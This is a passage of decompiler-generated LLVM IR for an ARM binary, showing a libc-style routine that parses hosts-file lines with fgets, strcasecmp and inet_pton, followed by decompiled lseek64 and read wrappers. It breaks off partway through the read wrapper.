dec_label_pc_1204c:                               ; preds = %dec_label_pc_121e0
  %v0_12050 = load i32, i32* @r4, align 4
  %v1_12050 = add i32 %v0_12050, 4
  %v2_12050 = inttoptr i32 %v1_12050 to i32*
  %v3_12050 = load i32, i32* %v2_12050, align 4
  store i32 %v3_12050, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_12058 = load i32, i32* @sb, align 4
  %v2_12058 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_12058, i32* %v2_12058, align 4
  store i32 %v0_120b0, i32* @ip, align 4
  %v0_12060 = load i32, i32* %r3.global-to-local, align 4
  %v1_12060 = load i32, i32* @sb, align 4
  %v2_12060 = inttoptr i32 %v1_12060 to i32*
  store i32 %v0_12060, i32* %v2_12060, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1206c = load i32, i32* @ip, align 4
  %v1_1206c = load i32, i32* %r0.global-to-local, align 4
  %v2_1206c = inttoptr i32 %v1_1206c to i32*
  store i32 %v0_1206c, i32* %v2_1206c, align 4
  %v0_12070 = load i32, i32* %r3.global-to-local, align 4
  %v1_12070 = load i32, i32* @sb, align 4
  %v2_12070 = add i32 %v1_12070, 12
  %v3_12070 = inttoptr i32 %v2_12070 to i32*
  store i32 %v0_12070, i32* %v3_12070, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_1207c = load i32, i32* @r4, align 4
  %v1_1207c = add i32 %v0_1207c, 8
  store i32 %v1_1207c, i32* %r1.global-to-local, align 4
  %v0_12080 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_12080, i32* @sl, align 4
  %v1_12084 = load i32, i32* @sb, align 4
  %v2_12084 = add i32 %v1_12084, 8
  %v3_12084 = inttoptr i32 %v2_12084 to i32*
  store i32 10, i32* %v3_12084, align 4
  %v0_12088 = load i32, i32* %r3.global-to-local, align 4
  %v1_12088 = load i32, i32* @sb, align 4
  %v2_12088 = add i32 %v1_12088, 16
  %v3_12088 = inttoptr i32 %v2_12088 to i32*
  store i32 %v0_12088, i32* %v3_12088, align 4
  %v0_1208c = load i32, i32* %r1.global-to-local, align 4
  %v1_1208c = load i32, i32* @sb, align 4
  %v2_1208c = add i32 %v1_1208c, 4
  %v3_1208c = inttoptr i32 %v2_1208c to i32*
  store i32 %v0_1208c, i32* %v3_1208c, align 4
  %v0_12090 = load i32, i32* %r2.global-to-local, align 4
  %v1_12090 = load i32, i32* %r3.global-to-local, align 4
  %v2_12090 = add i32 %v1_12090, 4
  %v3_12090 = inttoptr i32 %v2_12090 to i32*
  store i32 %v0_12090, i32* %v3_12090, align 4
  br label %dec_label_pc_12214

dec_label_pc_12098:                               ; preds = %dec_label_pc_11f60
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_120a4

dec_label_pc_120a4:                               ; preds = %.thread, %dec_label_pc_12098
  %v2_120b4.pre-phi = phi i32* [ %v2_11f80, %.thread ], [ %.pre, %dec_label_pc_12098 ]
  %v0_120b0 = phi i32 [ %v1_11fdc, %.thread ], [ 0, %dec_label_pc_12098 ]
  %stack_var_-40.1 = phi i32 [ %v1_11fe8, %.thread ], [ 0, %dec_label_pc_12098 ]
  %stack_var_-48.1 = phi i32 [ %v1_11fe4, %.thread ], [ 0, %dec_label_pc_12098 ]
  %stack_var_-52.0 = phi i32 [ %v0_11fd0, %.thread ], [ %v0_11f30, %dec_label_pc_12098 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* @ip, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_120b4.pre-phi, align 4
  %v2_12178 = inttoptr i32 %v0_11f34 to i8*
  %v7_121b0 = icmp eq i32 %v0_11f2c, 2
  %v7_121d8 = icmp eq i32 %v0_11f2c, 10
  br label %dec_label_pc_121fc

dec_label_pc_120bc:                               ; preds = %dec_label_pc_121fc
  %v0_120bc = load i32, i32* @fp, align 4
  store i32 %v0_120bc, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_120c4 = call i32 @__GI_strchr(i32 %v0_120bc, i32 35)
  store i32 %v2_120c4, i32* %r0.global-to-local, align 4
  %v3_120c8 = icmp eq i32 %v2_120c4, 0
  br i1 %v3_120c8, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_120bc
  %v0_120d011 = load i32, i32* @fp, align 4
  store i32 %v0_120d011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_1213c.preheader

bb75:                                             ; preds = %dec_label_pc_120bc
  %v3_120c4 = inttoptr i32 %v2_120c4 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_120d0 = load i32, i32* @fp, align 4
  store i32 %v0_120d0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_120c4, align 1
  %v0_1213c30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1213c.preheader

dec_label_pc_1213c.preheader:                     ; preds = %bb75, %.thread10
  %v0_1213c30 = phi i32 [ %v0_1213c30.pre, %bb75 ], [ %v0_120d011, %.thread10 ]
  %v1_1213c31 = inttoptr i32 %v0_1213c30 to i8*
  %v2_1213c32 = load i8, i8* %v1_1213c31, align 1
  %v3_1213c33 = zext i8 %v2_1213c32 to i32
  store i32 %v3_1213c33, i32* %r3.global-to-local, align 4
  %v2_1214034 = icmp eq i8 %v2_1213c32, 0
  br i1 %v2_1214034, label %dec_label_pc_12148, label %dec_label_pc_120e8.preheader

dec_label_pc_120e0:                               ; preds = %dec_label_pc_120f4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_120e4 = inttoptr i32 %v8_1210c to i8*
  store i8 0, i8* %v3_120e4, align 1
  %v4_120e4 = load i32, i32* %r2.global-to-local, align 4
  %v5_120e4 = add i32 %v4_120e4, 1
  store i32 %v5_120e4, i32* %r2.global-to-local, align 4
  %v1_120e8 = inttoptr i32 %v5_120e4 to i8*
  %v2_120e8 = load i8, i8* %v1_120e8, align 1
  %v3_120e8 = zext i8 %v2_120e8 to i32
  store i32 %v3_120e8, i32* %r1.global-to-local, align 4
  %v2_120ec = icmp eq i8 %v2_120e8, 0
  br i1 %v2_120ec, label %dec_label_pc_12148, label %dec_label_pc_120f4

dec_label_pc_120f4:                               ; preds = %dec_label_pc_120e8.preheader, %dec_label_pc_120e0
  %v8_1210c = phi i32 [ %v5_120e4, %dec_label_pc_120e0 ], [ %v0_120e820, %dec_label_pc_120e8.preheader ]
  %v1_120fc = phi i32 [ %v3_120e8, %dec_label_pc_120e0 ], [ %v3_120e823, %dec_label_pc_120e8.preheader ]
  %v2_120f8 = load i32, i32* @global_var_1d7a4, align 4
  store i32 %v2_120f8, i32* %r3.global-to-local, align 4
  %v3_120fc = mul nuw nsw i32 %v1_120fc, 2
  %v4_120fc = add i32 %v3_120fc, %v2_120f8
  %v5_120fc = inttoptr i32 %v4_120fc to i8*
  %v6_120fc = load i8, i8* %v5_120fc, align 1
  %v8_120fc = zext i8 %v6_120fc to i32
  store i32 %v8_120fc, i32* %r3.global-to-local, align 4
  %v1_12100 = and i32 %v8_120fc, 32
  %v2_12100 = icmp eq i32 %v1_12100, 0
  br i1 %v2_12100, label %dec_label_pc_12108, label %dec_label_pc_120e0

dec_label_pc_12108:                               ; preds = %dec_label_pc_120f4
  %v0_12108 = load i32, i32* @r6, align 4
  %v7_1210c = icmp slt i32 %v0_12108, 7
  br i1 %v7_1210c, label %bb76, label %dec_label_pc_1211c.preheader

bb76:                                             ; preds = %dec_label_pc_12108
  %v9_1210c = load i32, i32* @r4, align 4
  %v13_1210c = mul i32 %v0_12108, 4
  %v14_1210c = add i32 %v9_1210c, %v13_1210c
  %v15_1210c = inttoptr i32 %v14_1210c to i32*
  store i32 %v8_1210c, i32* %v15_1210c, align 4
  %v8_12110 = load i32, i32* @r6, align 4
  %v9_12110 = add i32 %v8_12110, 1
  store i32 %v9_12110, i32* @r6, align 4
  %v0_1211c25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1211c.preheader

dec_label_pc_1211c.preheader:                     ; preds = %bb76, %dec_label_pc_12108
  %v0_1211c25 = phi i32 [ %v0_1211c25.pre, %bb76 ], [ %v8_1210c, %dec_label_pc_12108 ]
  %v1_1211c26 = inttoptr i32 %v0_1211c25 to i8*
  %v2_1211c27 = load i8, i8* %v1_1211c26, align 1
  %v3_1211c28 = zext i8 %v2_1211c27 to i32
  store i32 %v3_1211c28, i32* %r1.global-to-local, align 4
  %v2_1212029 = icmp eq i8 %v2_1211c27, 0
  br i1 %v2_1212029, label %dec_label_pc_1213c.loopexit, label %dec_label_pc_12128.lr.ph

dec_label_pc_12128.lr.ph:                         ; preds = %dec_label_pc_1211c.preheader
  %v2_1212c.pre = load i32, i32* @global_var_1d7a4, align 4
  br label %dec_label_pc_12128

dec_label_pc_12118:                               ; preds = %dec_label_pc_12128
  %v1_12118 = add i32 %v0_12118, 1
  store i32 %v1_12118, i32* %r2.global-to-local, align 4
  %v1_1211c = inttoptr i32 %v1_12118 to i8*
  %v2_1211c = load i8, i8* %v1_1211c, align 1
  %v3_1211c = zext i8 %v2_1211c to i32
  store i32 %v3_1211c, i32* %r1.global-to-local, align 4
  %v2_12120 = icmp eq i8 %v2_1211c, 0
  br i1 %v2_12120, label %dec_label_pc_1213c.loopexit, label %dec_label_pc_12128

dec_label_pc_12128:                               ; preds = %dec_label_pc_12128.lr.ph, %dec_label_pc_12118
  %v0_12118 = phi i32 [ %v0_1211c25, %dec_label_pc_12128.lr.ph ], [ %v1_12118, %dec_label_pc_12118 ]
  %v1_12130 = phi i32 [ %v3_1211c28, %dec_label_pc_12128.lr.ph ], [ %v3_1211c, %dec_label_pc_12118 ]
  store i32 %v2_1212c.pre, i32* %r3.global-to-local, align 4
  %v3_12130 = mul nuw nsw i32 %v1_12130, 2
  %v4_12130 = add i32 %v3_12130, %v2_1212c.pre
  %v5_12130 = inttoptr i32 %v4_12130 to i8*
  %v6_12130 = load i8, i8* %v5_12130, align 1
  %v8_12130 = zext i8 %v6_12130 to i32
  store i32 %v8_12130, i32* %r3.global-to-local, align 4
  %v1_12134 = and i32 %v8_12130, 32
  %v2_12134 = icmp eq i32 %v1_12134, 0
  br i1 %v2_12134, label %dec_label_pc_12118, label %dec_label_pc_1213c.loopexit

dec_label_pc_1213c.loopexit:                      ; preds = %dec_label_pc_12128, %dec_label_pc_12118, %dec_label_pc_1211c.preheader
  %v0_1213c = phi i32 [ %v0_1211c25, %dec_label_pc_1211c.preheader ], [ %v0_12118, %dec_label_pc_12128 ], [ %v1_12118, %dec_label_pc_12118 ]
  %v1_1213c = inttoptr i32 %v0_1213c to i8*
  %v2_1213c = load i8, i8* %v1_1213c, align 1
  %v3_1213c = zext i8 %v2_1213c to i32
  store i32 %v3_1213c, i32* %r3.global-to-local, align 4
  %v2_12140 = icmp eq i8 %v2_1213c, 0
  br i1 %v2_12140, label %dec_label_pc_12148, label %dec_label_pc_120e8.preheader

dec_label_pc_120e8.preheader:                     ; preds = %dec_label_pc_1213c.preheader, %dec_label_pc_1213c.loopexit
  %v0_120e820 = phi i32 [ %v0_1213c, %dec_label_pc_1213c.loopexit ], [ %v0_1213c30, %dec_label_pc_1213c.preheader ]
  %v1_120e821 = inttoptr i32 %v0_120e820 to i8*
  %v2_120e822 = load i8, i8* %v1_120e821, align 1
  %v3_120e823 = zext i8 %v2_120e822 to i32
  store i32 %v3_120e823, i32* %r1.global-to-local, align 4
  %v2_120ec24 = icmp eq i8 %v2_120e822, 0
  br i1 %v2_120ec24, label %dec_label_pc_12148, label %dec_label_pc_120f4

dec_label_pc_12148:                               ; preds = %dec_label_pc_1213c.loopexit, %dec_label_pc_120e8.preheader, %dec_label_pc_120e0, %dec_label_pc_1213c.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1214c = load i32, i32* @r6, align 4
  %v1_12150 = load i32, i32* @r4, align 4
  %v5_12150 = mul i32 %v0_1214c, 4
  %v6_12150 = add i32 %v1_12150, %v5_12150
  %v7_12150 = inttoptr i32 %v6_12150 to i32*
  store i32 0, i32* %v7_12150, align 4
  %v7_12154 = icmp sgt i32 %v0_1214c, 1
  br i1 %v7_12154, label %dec_label_pc_12158, label %dec_label_pc_121fc

dec_label_pc_12158:                               ; preds = %dec_label_pc_12148
  %v2_12158 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_12158, i32* %r0.global-to-local, align 4
  %v7_1215c = icmp eq i32 %v2_12158, 1
  br i1 %v7_1215c, label %dec_label_pc_12230, label %dec_label_pc_12164

dec_label_pc_12164:                               ; preds = %dec_label_pc_12158
  %v7_12164 = icmp eq i32 %v2_12158, 2
  br i1 %v7_12164, label %dec_label_pc_12170, label %dec_label_pc_1219c.preheader

dec_label_pc_1219c.preheader:                     ; preds = %dec_label_pc_12164
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1219c

dec_label_pc_12170:                               ; preds = %dec_label_pc_12164
  store i32 %v0_11f34, i32* %r0.global-to-local, align 4
  %v0_12174 = load i32, i32* @r4, align 4
  %v1_12174 = inttoptr i32 %v0_12174 to i32*
  %v2_12174 = load i32, i32* %v1_12174, align 4
  store i32 %v2_12174, i32* @r1, align 4
  %v3_12178 = call i32 @__GI_strcoll(i8* %v2_12178, i32 %v2_12174)
  store i32 %v3_12178, i32* %r0.global-to-local, align 4
  %v2_1217c = icmp eq i32 %v3_12178, 0
  br i1 %v2_1217c, label %dec_label_pc_121ac, label %dec_label_pc_121fc

dec_label_pc_12188:                               ; preds = %dec_label_pc_1219c
  %v0_12188 = load i32, i32* @r4, align 4
  %v4_12188 = mul i32 %v1_12188, 4
  %v5_12188 = add i32 %v0_12188, %v4_12188
  %v6_12188 = inttoptr i32 %v5_12188 to i32*
  %v7_12188 = load i32, i32* %v6_12188, align 4
  store i32 %v7_12188, i32* %r1.global-to-local, align 4
  %v3_1218c = call i32 @__GI_strcasecmp(i8* %v2_12178, i32 %v7_12188)
  store i32 %v3_1218c, i32* %r0.global-to-local, align 4
  %v2_12190 = icmp eq i32 %v3_1218c, 0
  %v0_12194 = load i32, i32* @r5, align 4
  %v1_12194 = add i32 %v0_12194, 1
  store i32 %v1_12194, i32* @r5, align 4
  br i1 %v2_12190, label %dec_label_pc_121ac, label %dec_label_pc_1219c

dec_label_pc_1219c:                               ; preds = %dec_label_pc_1219c.preheader, %dec_label_pc_12188
  %v1_12188 = phi i32 [ 1, %dec_label_pc_1219c.preheader ], [ %v1_12194, %dec_label_pc_12188 ]
  %v1_1219c = load i32, i32* @r6, align 4
  store i32 %v0_11f34, i32* %r0.global-to-local, align 4
  %v5_121a4 = icmp slt i32 %v1_12188, %v1_1219c
  br i1 %v5_121a4, label %dec_label_pc_12188, label %dec_label_pc_121fc

dec_label_pc_121ac:                               ; preds = %dec_label_pc_12188, %dec_label_pc_12170
  store i32 %v0_11f2c, i32* %r1.global-to-local, align 4
  br i1 %v7_121b0, label %dec_label_pc_121b8, label %dec_label_pc_121d4

dec_label_pc_121b8:                               ; preds = %dec_label_pc_121ac
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_121bc = load i32, i32* @r7, align 4
  store i32 %v0_121bc, i32* %r2.global-to-local, align 4
  %v0_121c0 = load i32, i32* @r4, align 4
  %v1_121c0 = inttoptr i32 %v0_121c0 to i32*
  %v2_121c0 = load i32, i32* %v1_121c0, align 4
  store i32 %v2_121c0, i32* %r1.global-to-local, align 4
  %v3_121c4 = inttoptr i32 %v2_121c0 to i8*
  %v4_121c4 = call i32 @inet_pton(i32 2, i8* %v3_121c4, i32 %v0_121bc)
  store i32 %v4_121c4, i32* %r0.global-to-local, align 4
  %v5_121cc = icmp sgt i32 %v4_121c4, 0
  br i1 %v5_121cc, label %dec_label_pc_12008, label %dec_label_pc_121f8

dec_label_pc_121d4:                               ; preds = %dec_label_pc_121ac
  store i32 %v0_11f2c, i32* %r2.global-to-local, align 4
  br i1 %v7_121d8, label %dec_label_pc_121e0, label %dec_label_pc_121f8

dec_label_pc_121e0:                               ; preds = %dec_label_pc_121d4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_121e4 = load i32, i32* @r4, align 4
  %v1_121e4 = inttoptr i32 %v0_121e4 to i32*
  %v2_121e4 = load i32, i32* %v1_121e4, align 4
  store i32 %v2_121e4, i32* %r1.global-to-local, align 4
  store i32 %v0_120b0, i32* %r2.global-to-local, align 4
  %v3_121ec = inttoptr i32 %v2_121e4 to i8*
  %v4_121ec = call i32 @inet_pton(i32 10, i8* %v3_121ec, i32 %v0_120b0)
  store i32 %v4_121ec, i32* %r0.global-to-local, align 4
  %v5_121f4 = icmp sgt i32 %v4_121ec, 0
  br i1 %v5_121f4, label %dec_label_pc_1204c, label %dec_label_pc_121f8

dec_label_pc_121f8:                               ; preds = %dec_label_pc_121b8, %dec_label_pc_121d4, %dec_label_pc_121e0
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_121fc

dec_label_pc_121fc:                               ; preds = %dec_label_pc_1219c, %dec_label_pc_12170, %dec_label_pc_12148, %dec_label_pc_121f8, %dec_label_pc_120a4
  %v0_121fc = load i32, i32* @fp, align 4
  store i32 %v0_121fc, i32* %r0.global-to-local, align 4
  %v0_12200 = load i32, i32* @r8, align 4
  store i32 %v0_12200, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_12208 = call i32 @fgets(i32 %v0_121fc, i32 %v0_12200, i32 %stack_var_-52.0)
  store i32 %v3_12208, i32* %r0.global-to-local, align 4
  %v2_1220c = icmp eq i32 %v3_12208, 0
  br i1 %v2_1220c, label %dec_label_pc_12214, label %dec_label_pc_120bc

dec_label_pc_12214:                               ; preds = %dec_label_pc_121fc, %dec_label_pc_1204c, %dec_label_pc_12008
  %v2_12214 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_12214, i32* %r3.global-to-local, align 4
  %v7_12218 = icmp eq i32 %v2_12214, 1
  br i1 %v7_12218, label %dec_label_pc_12230, label %dec_label_pc_12220

dec_label_pc_12220:                               ; preds = %dec_label_pc_12214
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_12224 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_12224 = call i32 @__GI_fclose(i8* %v1_12224)
  store i32 %v2_12224, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12230

dec_label_pc_1222c:                               ; preds = %dec_label_pc_11f48, %bb74, %dec_label_pc_11f9c, %dec_label_pc_11f94, %dec_label_pc_11f88, %dec_label_pc_11f74, %dec_label_pc_11f58
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_12230

dec_label_pc_12230:                               ; preds = %dec_label_pc_12158, %dec_label_pc_12214, %dec_label_pc_12220, %dec_label_pc_11ff0, %dec_label_pc_1222c
  %v0_12230 = load i32, i32* @sl, align 4
  store i32 %v0_12230, i32* %r0.global-to-local, align 4
  store i32 %v3_11f18, i32* @r4, align 4
  store i32 %v6_11f18, i32* @r5, align 4
  store i32 %v12_11f18, i32* @r7, align 4
  store i32 %v15_11f18, i32* @r8, align 4
  store i32 %v21_11f18, i32* @sl, align 4
  store i32 %v24_11f18, i32* @fp, align 4
  ret i32 %v0_12230

; uselistorder directives
  uselistorder i32 %v1_12188, { 1, 0 }
  uselistorder i32 %v0_1214c, { 1, 0 }
  uselistorder i32 %v3_120e823, { 1, 0 }
  uselistorder i32 %v0_120e820, { 1, 0 }
  uselistorder i32 %v2_120c4, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_11fc4, { 1, 0 }
  uselistorder i32 %v0_11f88, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11f6c, { 1, 0 }
  uselistorder i32 %v0_11f38, { 1, 0, 2 }
  uselistorder i32 %v0_11f2c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_11f28, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 10, 16, 11, 12, 13, 14, 15, 24, 17, 18, 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23 }
  uselistorder i32* %r2.global-to-local, { 16, 4, 5, 9, 10, 14, 11, 13, 12, 15, 0, 1, 2, 3, 6, 7, 8, 17, 19, 18, 20 }
  uselistorder i32* %r1.global-to-local, { 11, 2, 5, 6, 7, 13, 8, 14, 9, 10, 0, 1, 3, 4, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32 34, { 3, 1, 2, 0, 4, 5, 6 }
  uselistorder i32 (i8*)* @__GI_fclose, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 6, 0, 1, 2, 3, 4, 7, 5 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 1, 2, 3, 4, 0 }
  uselistorder i32 7, { 2, 7, 8, 3, 4, 5, 0, 6, 10, 9, 1 }
  uselistorder i32* @global_var_1d7a4, { 0, 6, 2, 7, 1, 3, 4, 5 }
  uselistorder i32 35, { 0, 2, 3, 1 }
  uselistorder i32 10, { 3, 4, 25, 5, 6, 26, 27, 28, 29, 30, 22, 11, 21, 7, 31, 2, 32, 33, 34, 35, 9, 12, 36, 13, 37, 14, 15, 16, 0, 23, 24, 17, 19, 20, 38, 8, 1, 10, 18 }
  uselistorder i32 12, { 30, 31, 32, 0, 33, 7, 34, 18, 12, 13, 3, 37, 14, 10, 63, 64, 65, 66, 67, 68, 11, 69, 70, 71, 72, 73, 74, 15, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 5, 4, 59, 60, 61, 16, 19, 22, 29, 20, 21, 40, 41, 42, 1, 23, 38, 8, 39, 9, 24, 2, 43, 17, 44, 45, 46, 47, 75, 6, 62, 35, 36, 25, 26, 27, 28, 48 }
  uselistorder i32* @sb, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 15, 16, 17, 18, 19, 20, 21, 22, 23, 30, 31, 24, 25, 26, 27, 28, 29, 32, 33, 34, 35, 36, 37, 0, 38 }
  uselistorder i32 80, { 0, 3, 4, 5, 1, 2 }
  uselistorder i32 48, { 7, 4, 10, 2, 11, 12, 13, 3, 5, 14, 6, 15, 9, 16, 1, 0, 8 }
  uselistorder i32 36, { 4, 5, 6, 8, 9, 10, 11, 3, 1, 7, 2, 0, 12, 13, 14 }
  uselistorder i32 56, { 4, 9, 6, 3, 7, 2, 0, 8, 5, 1 }
  uselistorder i32 44, { 3, 4, 5, 9, 10, 11, 1, 2, 7, 8, 0, 6 }
  uselistorder i32 -48, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32 -32, { 1, 5, 2, 6, 7, 3, 0, 4 }
  uselistorder i32 32, { 31, 32, 33, 0, 34, 35, 26, 4, 3, 6, 5, 8, 7, 43, 23, 44, 21, 22, 19, 45, 24, 46, 47, 29, 30, 1, 20, 38, 36, 37, 48, 15, 49, 2, 25, 50, 51, 52, 53, 54, 16, 55, 27, 28, 39, 40, 41, 42, 10, 9, 12, 11, 17, 18, 14, 13 }
  uselistorder i32* @fp, { 19, 22, 20, 1, 21, 23, 24, 25, 26, 0, 28, 27, 29, 30, 31, 42, 2, 32, 33, 34, 35, 36, 37, 38, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 39, 40, 41, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* @sl, { 4, 5, 6, 7, 10, 8, 9, 11, 12, 13, 14, 15, 16, 17, 2, 3, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 51, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 1, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i32* @r8, { 15, 16, 17, 18, 19, 20, 21, 5, 6, 7, 22, 27, 28, 0, 29, 64, 65, 66, 67, 1, 68, 69, 70, 71, 79, 80, 91, 92, 8, 9, 10, 11, 12, 13, 14, 72, 73, 74, 75, 76, 77, 78, 81, 82, 83, 84, 85, 86, 3, 4, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 2, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 87, 88, 89, 90, 23, 24, 25, 26 }
  uselistorder i32* @r7, { 37, 39, 40, 38, 41, 42, 43, 44, 45, 46, 9, 10, 11, 12, 13, 14, 15, 1, 47, 55, 54, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 86, 87, 88, 89, 111, 16, 17, 2, 18, 6, 19, 20, 21, 22, 23, 24, 25, 26, 27, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 90, 91, 92, 93, 28, 29, 30, 31, 56, 3, 57, 58, 4, 5, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 0, 7, 8, 109, 110, 105, 106, 107, 108, 48, 49, 50, 51, 52, 53, 32, 33, 34, 35, 36 }
  uselistorder label %dec_label_pc_12230, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1222c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_121fc, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_121f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1219c, { 1, 0 }
  uselistorder label %dec_label_pc_12148, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_120e8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_12128, { 1, 0 }
  uselistorder label %dec_label_pc_120a4, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_11f58, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12284, label %dec_label_pc_12270

dec_label_pc_12270:                               ; preds = %entry
  %v0_12270 = call i32 @__errno_location()
  %v0_12274 = load i32, i32* %r4.global-to-local, align 4
  %v1_12274 = sub i32 0, %v0_12274
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1227c = inttoptr i32 %v0_12270 to i32*
  store i32 %v1_12274, i32* %v2_1227c, align 4
  %v0_1228c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1228c

dec_label_pc_12284:                               ; preds = %entry
  %v2_12284 = icmp eq i32 %arg1, 0
  br i1 %v2_12284, label %dec_label_pc_12298, label %dec_label_pc_1228c

dec_label_pc_1228c:                               ; preds = %dec_label_pc_12284, %dec_label_pc_12270
  %v0_1228c = phi i32 [ %arg1, %dec_label_pc_12284 ], [ %v0_1228c.pre, %dec_label_pc_12270 ]
  br label %dec_label_pc_1229c

dec_label_pc_12298:                               ; preds = %dec_label_pc_12284
  br label %dec_label_pc_1229c

dec_label_pc_1229c:                               ; preds = %dec_label_pc_1228c, %dec_label_pc_12298
  %v14_122a0 = phi i32 [ %v0_1228c, %dec_label_pc_1228c ], [ %tmp9, %dec_label_pc_12298 ]
  ret i32 %v14_122a0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1229c, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_122a4 = load i32, i32* @r4, align 4
  store i32 %v3_122a4, i32* %stack_var_-8, align 4
  %v1_122a8 = load i32, i32* @r1, align 4
  %v2_122a8 = inttoptr i32 %v1_122a8 to i32*
  %v3_122a8 = load i32, i32* @r2, align 4
  %v4_122a8 = call i32 @read(i32 %arg1, i32* %v2_122a8, i32 %v3_122a8)
  store i32 %v4_122a8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_122a8, -4095
  br i1 %tmp, label %dec_label_pc_122c8, label %dec_label_pc_122b8

dec_label_pc_122b8:                               ; preds = %entry
  %v0_122b8 = call i32 @__errno_location()
  %v0_122bc = load i32, i32* %r4.global-to-local, align 4
  %v1_122bc = sub i32 0, %v0_122bc
  %v2_122c0 = inttoptr i32 %v0_122b8 to i32*
  store i32 %v1_122bc, i32* %v2_122c0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_122c8

dec_label_pc_122c8:                               ; preds = %entry, %dec_label_pc_122b8
  %v0_122c8 = phi i32 [ %v4_122a8, %entry ], [ -1, %dec_label_pc_122b8 ]
